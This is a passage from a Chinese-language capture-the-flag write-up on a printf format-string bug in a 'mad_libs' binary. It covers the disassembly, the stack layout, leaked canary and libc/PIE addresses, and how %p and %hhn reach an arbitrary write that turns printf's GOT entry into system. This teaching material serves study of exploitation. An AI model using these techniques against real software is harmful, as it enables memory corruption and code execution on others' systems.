\texttt{test\ \allowbreak{}rax,\allowbreak{}\ \allowbreak{}rax} & 做 AND 但只設旗標；\texttt{test\ \allowbreak{}rax,\allowbreak{}rax} +
\texttt{je} = 「如果 rax == 0 就跳」 \\
\texttt{cmp\ \allowbreak{}a,\allowbreak{}\ \allowbreak{}b} & 算 \texttt{a\ \allowbreak{}-\allowbreak{}\ \allowbreak{}b} 只設旗標；\texttt{jle} =
「（\textbf{有號}）小於等於就跳」，\texttt{ja} =
「（\textbf{無號}）大於就跳」（有號/無號判斷不同，見
\texttt{wp/\allowbreak{}00\_\allowbreak{}基礎知識\_\allowbreak{}從零開始.\allowbreak{}md} §5.2） \\
\texttt{mov\ \allowbreak{}eax,\allowbreak{}\ \allowbreak{}0} & 把 \texttt{rax} 清 0。\textbf{對 variadic
函式（如 printf）非常重要}：代表「沒有用到 SSE 向量參數」 \\
\end{longtable}
}

\paragraph{\texorpdfstring{2.2 \texttt{\_\allowbreak{}start}（0x10e0）---
程式真正的入口}{2.2 \_start（0x10e0）--- 程式真正的入口}}\label{start0x10e0-ux7a0bux5f0fux771fux6b63ux7684ux5165ux53e3}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
    10e0: f3 0f 1e fa          endbr64
    10e4: 31 ed                 xor    ebp,ebp
    10e6: 49 89 d1              mov    r9,rdx
    10e9: 5e                    pop    rsi                      ; rsi = argc
    10ea: 48 89 e2              mov    rdx,rsp                  ; rdx = argv
    10ed: 48 83 e4 f0           and    rsp,0xfffffffffffffff0   ; 16-byte 對齊
    10f1: 50                    push   rax
    10f2: 54                    push   rsp
    10f3: 45 31 c0              xor    r8d,r8d                  ; r8  = 0 (fini)
    10f6: 31 c9                 xor    ecx,ecx                  ; rcx = 0 (init)
    10f8: 48 8d 3d ca 00 00 00  lea    rdi,[rip+0xca]           ; rdi = 0x11c9 = main  ← 關鍵！
    10ff: ff 15 bb 2e 00 00     call   QWORD PTR [rip+0x2ebb]   ; call __libc_start_main
    1105: f4                    hlt
\end{Verbatim}

\texttt{lea\ \allowbreak{}rdi,{[}rip+0xca{]}} 的目標是 \textbf{0x11c9}，這就是
\texttt{main} 的位址（\texttt{rip}
相對定址：\texttt{0x10ff\ \allowbreak{}+\ \allowbreak{}7\ \allowbreak{}+\ \allowbreak{}0xca\ \allowbreak{}=\ \allowbreak{}0x11c9}）。 \textbf{記住這個
0x11c9}：這個指標會被傳進
\texttt{\_\allowbreak{}\_\allowbreak{}libc\_\allowbreak{}start\_\allowbreak{}main}，後來我們能在堆疊上把它洩漏出來（第 47
個參數）。

\paragraph{\texorpdfstring{2.3 \texttt{main}（0x11c9）---
逐行}{2.3 main（0x11c9）--- 逐行}}\label{main0x11c9-ux9010ux884c}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
    11c9: f3 0f 1e fa           endbr64
    11cd: 55                     push   rbp
    11ce: 48 89 e5               mov    rbp,rsp
    11d1: 48 81 ec 20 01 00 00   sub    rsp,0x120
    11d8: 64 48 8b 04 25 28 00 00 00   mov  rax,QWORD PTR fs:0x28
    11e1: 48 89 45 f8            mov    QWORD PTR [rbp-0x8],rax
    11e5: 31 c0                  xor    eax,eax
\end{Verbatim}

\begin{itemize}
\tightlist
\item
  \texttt{push\ \allowbreak{}rbp;\ \allowbreak{}mov\ \allowbreak{}rbp,\allowbreak{}rsp} → 建立新的堆疊框（standard
  prologue）。
\item
  \texttt{sub\ \allowbreak{}rsp,\allowbreak{}0x120} → 保留 0x120 bytes 給區域變數。
\item
  \texttt{mov\ \allowbreak{}rax,\allowbreak{}QWORD\ \allowbreak{}PTR\ \allowbreak{}fs:\allowbreak{}0x28} → 讀 TLS 的 canary。
\item
  \texttt{mov\ \allowbreak{}{[}rbp-\allowbreak{}0x8{]},\allowbreak{}rax} → \textbf{canary 存在
  \texttt{{[}rbp-\allowbreak{}0x8{]}}}。
\item
  \texttt{xor\ \allowbreak{}eax,\allowbreak{}eax} → \texttt{rax\ \allowbreak{}=\ \allowbreak{}0}。
\end{itemize}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
    11e7: 48 8d 05 16 0e 00 00   lea    rax,[rip+0xe16]        # 2004
    11ee: 48 89 c7               mov    rdi,rax
    11f1: e8 9a fe ff ff         call   1090 <puts@plt>
    11f6: 48 8d 05 18 0e 00 00   lea    rax,[rip+0xe18]        # 2015
    11fd: 48 89 c7               mov    rdi,rax
    1200: e8 8b fe ff ff         call   1090 <puts@plt>
\end{Verbatim}

兩次 \texttt{puts}（\texttt{rdi} = 字串位址，符合呼叫慣例）：

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{$ objdump {-}s {-}j .rodata mad\_libs}
\NormalTok{ 2000 01000200 3d3d3d20 4d616420 4c696273  ....=== Mad Libs}
\NormalTok{ 2010 203d3d3d 0046696c 6c20696e 20746865   ===.Fill in the}
\NormalTok{ 2020 20626c61 6e6b7321 00282564 29203e20   blanks!.(\%d) \textgreater{}}
\NormalTok{ 2030 0053746f 72792063 6f6d706c 65746521  .Story complete!}
\end{Highlighting}
\end{Shaded}

\begin{itemize}
\tightlist
\item
  0x2004 = \texttt{"===\ \allowbreak{}Mad\ \allowbreak{}Libs\ \allowbreak{}==="}
\item
  0x2015 = \texttt{"Fill\ \allowbreak{}in\ \allowbreak{}the\ \allowbreak{}blanks!"}
\item
  0x2029 = \texttt{"(\%\allowbreak{}d)\ \allowbreak{}\textgreater{}\allowbreak{}\ \allowbreak{}"} ← 格式化字串
\item
  0x2031 = \texttt{"Story\ \allowbreak{}complete!"}
\end{itemize}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
    1205: c7 85 ec fe ff ff 00 00 00 00   mov DWORD PTR [rbp-0x114],0x0
    120f: eb 5a                jmp    126b                 ; 跳到迴圈條件
\end{Verbatim}

\textbf{迴圈計數器 \texttt{i} 存在 \texttt{{[}rbp-\allowbreak{}0x114{]}}（4
bytes）}，初始化為 0。

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
    1211: 8b 85 ec fe ff ff     mov    eax,DWORD PTR [rbp-0x114]  ; eax = i
    1217: 83 c0 01               add    eax,0x1                    ; eax = i+1
    121a: 89 c6                  mov    esi,eax                    ; ✶ 參數2 = i+1
    121c: 48 8d 05 06 0e 00 00   lea    rax,[rip+0xe06]            ; 0x2029 = "(%d) > "
    1223: 48 89 c7               mov    rdi,rax                    ; ✶ 參數1 = 格式字串
    1226: b8 00 00 00 00         mov    eax,0x0
    122b: e8 80 fe ff ff         call   10b0 <printf@plt>          ; printf("(%d) > ", i+1)
\end{Verbatim}

\texttt{esi} 放 \texttt{i+1}、\texttt{rdi} 放
\texttt{"(\%\allowbreak{}d)\ \allowbreak{}\textgreater{}\allowbreak{}\ \allowbreak{}"}，這完全符合呼叫慣例（第 1 參數
\texttt{rdi}、第 2 參數 \texttt{esi}）。

\begin{quote}
這個 \textbf{\texttt{printf@plt} 呼叫就是我們之後要劫持的目標}：把 GOT
裡的 printf 換成 system 之後，這行會變成
\texttt{system("(\%\allowbreak{}d)\ \allowbreak{}\textgreater{}\allowbreak{}\ \allowbreak{}")}。
\end{quote}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
    1230: 48 8b 15 19 2e 00 00  mov    rdx,QWORD PTR [rip+0x2e19]  # 4050 <stdin>
    1237: 48 8d 85 f0 fe ff ff  lea    rax,[rbp-0x110]             ; rax = &buf
    123e: be 00 01 00 00        mov    esi,0x100                   ; size = 256
    1243: 48 89 c7              mov    rdi,rax                     ; dst  = buf
    1246: e8 75 fe ff ff        call   10c0 <fgets@plt>            ; fgets(buf,0x100,stdin)
    124b: 48 85 c0              test   rax,rax
    124e: 74 26                 je     1276                        ; 讀不到 (EOF) 就跳出
\end{Verbatim}

\begin{itemize}
\tightlist
\item
  \texttt{rdx} 從 GOT 讀 \texttt{stdin}（\texttt{stdin} 是 COPY
  relocation，本體在 \texttt{mad\_\allowbreak{}libs} 的 \texttt{.\allowbreak{}bss} 0x4050）。
\item
  \textbf{\texttt{buf} 在 \texttt{{[}rbp-\allowbreak{}0x110{]}}，長度 0x100。} 這行
  \texttt{lea\ \allowbreak{}rax,{[}rbp-\allowbreak{}0x110{]}} 就是 \texttt{\&\allowbreak{}buf}。
\item
  \texttt{fgets} 讀到換行就停，所以我們\textbf{不能送
  \texttt{\textbackslash{}\allowbreak{}n}（0x0a）在 payload 中間}。
\end{itemize}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
    1250: 48 8d 85 f0 fe ff ff  lea    rax,[rbp-0x110]             ; rax = &buf
    1257: 48 89 c7              mov    rdi,rax                     ; rdi = &buf
    125a: b8 00 00 00 00        mov    eax,0x0                     ; 沒有向量參數
    125f: e8 4c fe ff ff        call   10b0 <printf@plt>           ; ✶✶✶ printf(buf) ✶✶✶
\end{Verbatim}

\begin{quote}
※警告 \textbf{這就是漏洞本體}：\texttt{rdi\ \allowbreak{}=\ \allowbreak{}\&\allowbreak{}buf}（使用者輸入），而
\texttt{printf} 是 variadic 函式，它會把 \texttt{rdi}
當成\textbf{格式字串}來解析！ 正確寫法應該是
\texttt{printf("\%\allowbreak{}s",\allowbreak{}\ \allowbreak{}buf)}。
\end{quote}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
    1264: 83 85 ec fe ff ff 01   add    DWORD PTR [rbp-0x114],0x1   ; i++
    126b: 83 bd ec fe ff ff 07   cmp    DWORD PTR [rbp-0x114],0x7
    1272: 7e 9d                  jle    1211                        ; i <= 7 就繼續
    1274: eb 01                  jmp    1277
    1276: 90                     nop                                ; fgets 失敗時跳來這
    1277: 48 8d 05 b3 0d 00 00   lea    rax,[rip+0xdb3]             # 2031
    127e: 48 89 c7               mov    rdi,rax
    1281: e8 0a fe ff ff         call   1090 <puts@plt>             ; puts("Story complete!")
    1286: b8 00 00 00 00         mov    eax,0x0
    128b: 48 8b 55 f8            mov    rdx,QWORD PTR [rbp-0x8]     ; rdx = 存回的 canary
    128f: 64 48 2b 14 25 28 00 00 00  sub rdx,QWORD PTR fs:0x28    ; 跟 TLS 的比
    1298: 74 05                  je     129f
    129a: e8 01 fe ff ff         call   10a0 <__stack_chk_fail@plt> ; 不一樣就爆炸
    129f: c9                     leave
    12a0: c3                     ret
\end{Verbatim}

\textbf{迴圈是 \texttt{i\ \allowbreak{}=\ \allowbreak{}0..\allowbreak{}7} → 總共 8 次}（\texttt{cmp\ \allowbreak{}...,\allowbreak{}0x7} +
\texttt{jle}）。這是我們全部的「開火次數」。 最後 \texttt{leave;\ \allowbreak{}ret}
回到 \texttt{\_\allowbreak{}\_\allowbreak{}libc\_\allowbreak{}start\_\allowbreak{}call\_\allowbreak{}main}。

\paragraph{\texorpdfstring{2.4 \texttt{setvbuf} 初始函式（0x12a1，由
\texttt{.\allowbreak{}init\_\allowbreak{}array}
呼叫）}{2.4 setvbuf 初始函式（0x12a1，由 .init\_array 呼叫）}}\label{setvbuf-ux521dux59cbux51fdux5f0f0x12a1ux7531-.init_array-ux547cux53eb}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
    12a1: ... 
    12d5: e8 f6 fd ff ff         call   10d0 <setvbuf@plt>   ; setvbuf(stdout, NULL, 2, 0)
    12f3: e8 d8 fd ff ff         call   10d0 <setvbuf@plt>   ; setvbuf(stderr, NULL, 2, 0)
\end{Verbatim}

\texttt{\_\allowbreak{}IONBF\ \allowbreak{}=\ \allowbreak{}2} → \textbf{stdout / stderr 都是「無緩衝」}。
\textbf{好處}：我們的 leak 和輸出會\textbf{立刻}送到 socket，不需要等
flush。做 format string 題時這很重要，否則 \texttt{\%\allowbreak{}p}
的結果會卡在緩衝區裡。

\paragraph{2.5
完整堆疊框圖（main）}\label{ux5b8cux6574ux5806ux758aux6846ux5716main}

\texttt{printf(buf)} 執行到
\texttt{call\ \allowbreak{}10b0\ \allowbreak{}\textless{}\allowbreak{}printf@plt\textgreater{}\allowbreak{}}（0x125f）那一刻，\texttt{rsp\ \allowbreak{}=\ \allowbreak{}rbp-\allowbreak{}0x120}：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
   位址大 (高位址)
   ┌───────────────────────────────────────────────────────────┐
   │ … 初始堆疊 argc / argv / envp / auxv …                    │
   ├───────────────────────────────────────────────────────────┤
   │ __libc_start_call_main 的框                               │
[rbp+0x28] │  ← 第 47 個可讀參數 = main 位址 (PIE+0x11c9)      │
   │                                                           │
[rbp+0x10] │  ← 第 44 ~ 46 個參數                              │
[rbp+0x08] │  ← 第 43 個參數：main 的返回位址                  │  = libc + 0x2a1ca
[rbp+0x00] │  ← 第 42 個參數：saved rbp (caller 的 rbp)        │  指向 stack
[rbp-0x08] │  ← 第 41 個參數：stack canary                     │  結尾一定是 0x00
[rbp-0x10] │  ← 第 40 個參數：(8 bytes 未用填充)               │
[rbp-0x11] │    ↑ buf 結尾 (buf[0xff] + NUL)                   │
   │                                                           │
[rbp-0x110]│  ← 第 8 個參數：char buf[0]   ✶我們輸入的開頭✶    │
   │     char buf[0x100]  共 32 個 8-byte slot                 │
   │     (第 8 ~ 第 39 個參數)                                 │
[rbp-0x18] │  ← 第 39 個參數：buf[248..255]                    │
[rbp-0x118]│  ← 第 7 個參數：(低位殘留 : 高位=i)  ← 不是輸入！ │
[rbp-0x114]│     int i (4 bytes)  ← 迴圈計數器                 │
[rbp-0x120]│  ← 第 6 個參數：(未初始化殘留) = rsp 底部         │
   └───────────────────────────────────────────────────────────┘
   位址小 (低位址)
\end{Verbatim}

\begin{itemize}
\tightlist
\item
  \texttt{buf} 佔 \texttt{rbp-\allowbreak{}0x110} \textasciitilde{}
  \texttt{rbp-\allowbreak{}0x0F}（0x100 bytes = slot 8 \textasciitilde{} 39）。
\item
  \textbf{\texttt{buf{[}8k{]}} = 第 \texttt{8+k} 個參數}（k =
  0,1,2,\ldots）。
\item
  slot 40 = \texttt{rbp-\allowbreak{}0x10}、slot 41 = canary、slot 42 = saved
  rbp、slot 43 = return address。
\end{itemize}

\paragraph{\texorpdfstring{2.6 PLT / GOT：\texttt{printf@plt}
到底怎麼跑}{2.6 PLT / GOT：printf@plt 到底怎麼跑}}\label{plt-gotprintfplt-ux5230ux5e95ux600eux9ebcux8dd1}

\textbf{GOT（Global Offset Table）}：放在 data
段的一張「函式位址表」，載入後由動態連結器填上真正的位址。
\textbf{PLT（Procedure Linkage Table）}：一小段程式碼，負責「去 GOT
拿位址然後跳過去」。

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
    10b0 <printf@plt>:                 ; .plt.sec 裡的入口（程式呼叫的目標）
    10b0: f3 0f 1e fa     endbr64
    10b4: ff 25 56 2f 00 00  jmp QWORD PTR [rip+0x2f56]   # → 0x4010 (printf@GOT)
    10ba: 0f 1f 44 00 00   nop
\end{Verbatim}

執行流程：

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\item
  \texttt{main} 執行 \texttt{call\ \allowbreak{}10b0} → 跳進 \texttt{printf@plt}。
\item
  \texttt{jmp\ \allowbreak{}QWORD\ \allowbreak{}PTR\ \allowbreak{}{[}0x4010{]}}：\textbf{去讀 GOT 裡的 8 bytes
  然後跳過去}。
\item
  \textbf{第一次}呼叫時，GOT 裡放的還是「lazy binding stub」的位址（用
  \texttt{objdump\ \allowbreak{}-\allowbreak{}s\ \allowbreak{}-\allowbreak{}j\ \allowbreak{}.\allowbreak{}got.\allowbreak{}plt} 可以看到初始值是
  \texttt{0x1050}）：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
3fe8 c03d0000 00000000 00000000 00000000   ; 0x3fe8=GOT[0]=_DYNAMIC
3ff8 00000000 00000000 30100000 00000000   ; 0x3ff8=GOT[2]=resolver, 0x4000=0x1030(puts)
4008 40100000 00000000 50100000 00000000   ; 0x4008=0x1040(ssp fail), 0x4010=0x1050(printf)
4018 60100000 00000000 70100000 00000000   ; 0x4018=0x1060(fgets),   0x4020=0x1070(setvbuf)
\end{Verbatim}

  跳到 0x1050 後會 \texttt{push\ \allowbreak{}2} 並跳去 resolver（0x1020），resolver
  找到真正的 \texttt{printf} 後\textbf{把位址寫回 GOT
  0x4010}，之後就直接跳了。
\item
  所以等我們開始攻擊時，\texttt{{[}0x4010{]}} 已經是真正的
  \texttt{printf} 位址（實測 = libc+0x600f0）：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
printf@GOT before write: 0x7f59a72600f0  (libc printf = 0x7f59a72600f0)
\end{Verbatim}
\end{enumerate}

\textbf{GOT 的各個位置（本題）}：

{\def\LTcaptype{none} % do not increment counter
\begin{longtable}[]{@{}ll@{}}
\toprule\noalign{}
GOT 位址 & 內容 \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
0x4000 & \texttt{puts} \\
0x4008 & \texttt{\_\allowbreak{}\_\allowbreak{}stack\_\allowbreak{}chk\_\allowbreak{}fail} \\
\textbf{0x4010} & \textbf{\texttt{printf}} ← 我們要改這個 \\
0x4018 & \texttt{fgets} \\
0x4020 & \texttt{setvbuf} \\
\end{longtable}
}

Partial RELRO 只保護到 0x4000，所以 \textbf{0x4010 可以寫}。

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{3. 漏洞原理：格式化字串（format
string）是什麼}\label{ux6f0fux6d1eux539fux7406ux683cux5f0fux5316ux5b57ux4e32format-stringux662fux4ec0ux9ebc}

\paragraph{3.1 一句話}\label{ux4e00ux53e5ux8a71}

\texttt{printf} 的第一個參數是\textbf{格式字串}，裡面 \texttt{\%\allowbreak{}}
開頭的東西會被當成「指令」。 \texttt{printf(buf)} 讓使用者決定格式字串 →
使用者就能： 1. \textbf{讀}任意堆疊內容（\texttt{\%\allowbreak{}p}、\texttt{\%\allowbreak{}s}）→
洩漏位址； 2. \textbf{寫}任意記憶體（\texttt{\%\allowbreak{}n}）→ 改 GOT。

\paragraph{\texorpdfstring{3.2 \texttt{\%\allowbreak{}p} 與
\texttt{\%\allowbreak{}N\$\allowbreak{}p}：從堆疊讀值}{3.2 \%p 與 \%N\$p：從堆疊讀值}}\label{p-ux8207-npux5f9eux5806ux758aux8b80ux503c}

\begin{itemize}
\tightlist
\item
  \texttt{\%\allowbreak{}p} 會把「下一個 variadic 參數」當成指標印出來。
\item
  \texttt{\%\allowbreak{}N\$\allowbreak{}p} 是「直接指定第 N 個參數」（\textbf{positional
  argument}），不用一直 \texttt{\%\allowbreak{}p} 消耗。
\end{itemize}

\textbf{為什麼第 6 個之後的參數在堆疊上？} 因為前 5 個整數參數照 ABI
放在 \texttt{rsi,\allowbreak{}\ \allowbreak{}rdx,\allowbreak{}\ \allowbreak{}rcx,\allowbreak{}\ \allowbreak{}r8,\allowbreak{}\ \allowbreak{}r9}（\texttt{rdi}
被格式字串用掉了）。glibc 的 \texttt{printf} 進入點會把這 5
個暫存器\textbf{存進自己的 register save area}，第 6
個之後就從堆疊（\texttt{rsp+8}，也就是跳過返回位址後的第一格）往上數。

\textbf{為什麼 \texttt{buf{[}0{]}} 剛好是第 8 個？} \texttt{printf(buf)}
的 \texttt{call} 發生在 \texttt{rsp\ \allowbreak{}=\ \allowbreak{}rbp-\allowbreak{}0x120} 時。\texttt{call}
把返回位址推到 \texttt{rbp-\allowbreak{}0x128}，於是 printf 的「堆疊參數區」從
\texttt{rbp-\allowbreak{}0x120} 開始：

{\def\LTcaptype{none} % do not increment counter
\begin{longtable}[]{@{}lll@{}}
\toprule\noalign{}
參數 & 位址 & 內容 \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
1 \textasciitilde{} 5 & \texttt{rsi,\allowbreak{}rdx,\allowbreak{}rcx,\allowbreak{}r8,\allowbreak{}r9} &
上一次呼叫留下的殘值（\texttt{fgets} 的殘渣） \\
6 & \texttt{rbp-\allowbreak{}0x120} & 未初始化殘留 \\
7 & \texttt{rbp-\allowbreak{}0x118} & 低 4 bytes 殘留 + 高 4 bytes = 迴圈計數器
\texttt{i} \\
\textbf{8} & \textbf{\texttt{rbp-\allowbreak{}0x110}} & \textbf{\texttt{buf{[}0{]}} ←
我們的輸入} \\
\end{longtable}
}

所以：\textbf{\texttt{buf{[}8k{]}} → 第 \texttt{(8+k)} 個參數}。

\begin{quote}
※注意 很多人第一次會猜 \texttt{\%\allowbreak{}6\$\allowbreak{}p}（因為前面 5
個是暫存器）。\textbf{這題是 \texttt{\%\allowbreak{}8\$\allowbreak{}p}}，而
\texttt{\%\allowbreak{}6\$\allowbreak{}p}/\texttt{\%\allowbreak{}7\$\allowbreak{}p} 印出來的是殘留垃圾。
\textbf{絕對不要用猜的}------§4 教你怎麼實測。
\end{quote}

\paragraph{3.3
實測驗證（真的做了，不是推論）}\label{ux5be6ux6e2cux9a57ux8b49ux771fux7684ux505aux4e86ux4e0dux662fux63a8ux8ad6}

送 \texttt{AAAABBBB} + 印出第 1\textasciitilde46 個參數：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
pos   1: 0x555555b9d2a1          ← heap 殘留（不是我們的）
pos   2: 0xfbad2088              ← _IO_FILE flags 殘留
pos   3: 0x7f
pos   4: 0x555555b9d387          ← heap 殘留
pos   5: (nil)
pos   6: 0x2                     ← rbp-0x120：上一次呼叫留下的垃圾（跟 i 無關）
pos   7: 0xe                     ← rbp-0x118：低 4 bytes 是殘留（0xe）、高 4 bytes 是 i = 0
pos   8: 0x4242424241414141      ← ✶ "AAAABBBB" little-endian = buf[0] ✶
pos   9: 0x2432257c70243125      ← "%1$p|%2$"
...
pos  40: 0x7ffc558b43c0          ← rbp-0x10（填充）
pos  41: 0xaccc1e4eb8b48b00      ← canary
pos  42: 0x7ffc558b4440          ← saved rbp
pos  43: <libc 返回位址>
\end{Verbatim}

\begin{quote}
上面 pos 1、3、4、6、7
都是「別的東西的殘留」，\textbf{每次執行都可能不同}（我實測也拿過
\texttt{(nil)}、\texttt{0x100000}、\texttt{0x40}）。 唯一穩定不變的是
\textbf{pos 8 = 你輸入的前 8 bytes}。 ※注意 \texttt{0xe} \textbf{不是}
\texttt{i}：\texttt{printf(buf)} 跑在\textbf{第一次迴圈}，此時
\texttt{i} 才剛被設成 0
（\texttt{1205:\allowbreak{}\ \allowbreak{}mov\ \allowbreak{}DWORD\ \allowbreak{}PTR\ \allowbreak{}{[}rbp-\allowbreak{}0x114{]},\allowbreak{}0x0}），所以 pos 7
的高 4 bytes 一定是 \texttt{0}。 \texttt{i} 存在
\texttt{{[}rbp-\allowbreak{}0x114{]}}，也就是 pos 7 的\textbf{高半部}，而 \texttt{i}
只會是 0\textasciitilde7。pos 6（\texttt{rbp-\allowbreak{}0x120}）跟 \texttt{i}
完全無關。
\end{quote}

再用 \texttt{/\allowbreak{}proc/\allowbreak{}\textless{}\allowbreak{}pid\textgreater{}\allowbreak{}/\allowbreak{}maps}
對照實際載入位址，跨多次執行都一致：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
=== PIE=0x7fdc7bf32000 LIBC=0x7fdc7bc00000 (PIE-LIBC=0x332000)
   pos 43: 0x7fdc7bc2a1ca  LIBC+0x2a1ca      ← main 的返回位址
   pos 47: 0x7fdc7bf331c9  PIE+0x11c9        ← main 的位址！
   pos 59: 0x7fdc7bf332f8  PIE+0x12f8
   pos 67: 0x7fdc7bf331c9  PIE+0x11c9        ← 又一次 main
   pos 70: 0x7fdc7bf330e0  PIE+0x10e0        ← _start
   pos 75: 0x7fdc7bf33105  PIE+0x1105        ← _start 裡 call 的返回位址
=== PIE=0x7ff047f33000 LIBC=0x7ff047c00000 (PIE-LIBC=0x333000)
   pos 43: 0x7ff047c2a1ca  LIBC+0x2a1ca
   pos 47: 0x7ff047f341c9  PIE+0x11c9
=== PIE=0x7f7b2d79a000 LIBC=0x7f7b2d400000 (PIE-LIBC=0x39a000)   ← 注意差距會變！
   pos 43: 0x7f7b2d42a1ca  LIBC+0x2a1ca
   pos 47: 0x7f7b2d79b1c9  PIE+0x11c9
\end{Verbatim}

\paragraph{\texorpdfstring{3.4 \texttt{\%\allowbreak{}n} / \texttt{\%\allowbreak{}hn} /
\texttt{\%\allowbreak{}hhn}：任意位址寫入}{3.4 \%n / \%hn / \%hhn：任意位址寫入}}\label{n-hn-hhnux4efbux610fux4f4dux5740ux5bebux5165}

\textbf{計數器（counter）怎麼算？} \texttt{printf}
內部有一個「到目前為止輸出了幾個字元」的計數器，\texttt{\%\allowbreak{}n}
就是把這個數字寫出去。

\begin{itemize}
\tightlist
\item
  每個 \texttt{\%\allowbreak{}c} / \texttt{\%\allowbreak{}\textless{}\allowbreak{}寬度\textgreater{}\allowbreak{}c}
  貢獻它的填充長度（\texttt{\%\allowbreak{}64c} → +64）；
\item
  格式字串裡\textbf{不是格式指令}的裸字元貢獻 1 個 / 字元（對齊用的
  \texttt{aaaaba} → +6）；
\item
  \textbf{格式指令本身不會被印出來、不貢獻任何字元}（\texttt{\%\allowbreak{}17\$\allowbreak{}hhn}
  貢獻 0；\texttt{\%\allowbreak{}64c} 只貢獻 64，不是 64+4）。
\end{itemize}

所以 \texttt{\%\allowbreak{}64c\%\allowbreak{}17\$\allowbreak{}hhn} 執行到 \texttt{\%\allowbreak{}17\$\allowbreak{}hhn} 那一刻的計數是
\textbf{64}。

\texttt{\%\allowbreak{}n}
\textbf{不是印東西}，而是「把目前為止已經印出的字元數寫進對應的指標參數」：

{\def\LTcaptype{none} % do not increment counter
\begin{longtable}[]{@{}ll@{}}
\toprule\noalign{}
指令 & 寫入大小 \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
\texttt{\%\allowbreak{}n} & 4 bytes（int） \\
\texttt{\%\allowbreak{}hn} & 2 bytes（short） \\
\texttt{\%\allowbreak{}hhn} & 1 byte（char） \\
\end{longtable}
}

\textbf{怎麼寫任意值到任意位址？}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  \texttt{\%\allowbreak{}n}
  需要「一個指標參數」。我們無法直接控制暫存器，但\textbf{可以控制
  \texttt{buf} 的內容}，而 \texttt{buf{[}8k{]}} 就是第 \texttt{8+k}
  個參數！
\item
  所以把「目標位址」用小端序寫在 \texttt{buf} 裡，假設落在第 17
  個參數，就用 \texttt{\%\allowbreak{}17\$\allowbreak{}hhn} 去寫 \texttt{*(char*)該位址}。
\item
  要寫的值 = 「印出的字元數」。用
  \texttt{\%\allowbreak{}\textless{}\allowbreak{}寬度\textgreater{}\allowbreak{}c} 把計數撐到目標值即可。
\end{enumerate}

\begin{quote}
★ \textbf{一句話抓住這裡的關鍵：控制 \texttt{buf} ＝
控制參數（而且是「指標」與「值」兩者都控制）。}

很多新手卡在「參數不是呼叫端 \texttt{printf("...",\allowbreak{}\ \allowbreak{}a,\allowbreak{}\ \allowbreak{}b)}
傳進去的嗎？為什麼我寫在 buffer 裡也算參數？」 ------因為
\texttt{printf}
\textbf{無從檢查}那些值「是不是真的參數」：它只是\textbf{照著編號，去固定的地方
（暫存器 + 呼叫者的堆疊）取 8 bytes 當參數用}。而我們那塊
\texttt{char\ \allowbreak{}buf{[}...{]}} 就躺在 \textbf{\texttt{printf}
呼叫者的堆疊上}，剛好落在「第 6 個參數以後」的區域裡。

所以對 \texttt{printf(buf)} 這種題目：

{\def\LTcaptype{none} % do not increment counter
\begin{longtable}[]{@{}
  >{\raggedright\arraybackslash}p{(\linewidth - 4\tabcolsep) * \real{0.3333}}
  >{\raggedright\arraybackslash}p{(\linewidth - 4\tabcolsep) * \real{0.3333}}
  >{\raggedright\arraybackslash}p{(\linewidth - 4\tabcolsep) * \real{0.3333}}@{}}
\toprule\noalign{}
\begin{minipage}[b]{\linewidth}\raggedright
我們控制的東西
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
它同時是\ldots{}
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
效果
\end{minipage} \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
\texttt{buf} 裡的\textbf{位址}（小端 8 bytes） & \texttt{printf}
眼中的「第 N 個參數」 & \texttt{\%\allowbreak{}N\$\allowbreak{}hhn} 會把值寫到\textbf{那個位址} \\
\texttt{buf} 裡的\textbf{格式指令}（\texttt{\%\allowbreak{}64c\%\allowbreak{}17\$\allowbreak{}hhn}） &
\texttt{printf} 眼中的「格式字串」 &
決定\textbf{要寫的值}（＝印出的字元數） \\
\end{longtable}
}

也就是說：\textbf{格式字串本身就是那塊 buffer} ------
攻擊者一手交「指令」、一手交「參數」，
兩者都在同一塊自己完全控制的記憶體裡。這就是 format string
能變成「任意位址任意寫入」的原因。 （\texttt{pwn2}
這題還多一層方便：程式自己會把 \texttt{printf} 的參數準備好幾個，
所以我們只要知道自己的 buffer 是第幾個參數就好 ------ §4
的四個技巧就是在量這個編號。）
\end{quote}

